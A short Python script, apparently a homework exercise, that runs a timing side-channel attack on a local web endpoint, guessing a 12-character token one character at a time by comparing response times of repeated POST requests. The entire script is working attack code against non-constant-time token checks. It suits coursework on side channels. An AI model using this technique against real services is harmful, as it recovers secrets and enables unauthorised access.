import requests
import string
import datetime

actual = 'b4351d395d2f'
token = 'b435'
url = 'http://0.0.0.0:8080/hw6/ex1'
no_of_tries = 10
possible_chars = [letter for letter in string.ascii_lowercase] + [number for number in string.digits]

while len(token) < 12:
    runtimes = []
    for letter in possible_chars:
        data = {
            'token': ''.join([token] + [letter] + ['a' for i in range(12 - len(token) - 1)])
        }
        runtime = []
        for j in range(no_of_tries):
            response = requests.post(url, json=data)
            runtime.append(response.elapsed)
        runtimes.append((letter, sorted(runtime)[5]))

    sorted_times = sorted(runtimes, key=lambda x: x[1], reverse=True)
    print(sorted_times)
    token += sorted_times[0][0]

print(token)
data = {
            'token': token
        }
response = requests.post(url, json=data)
print(response.status_code)
    
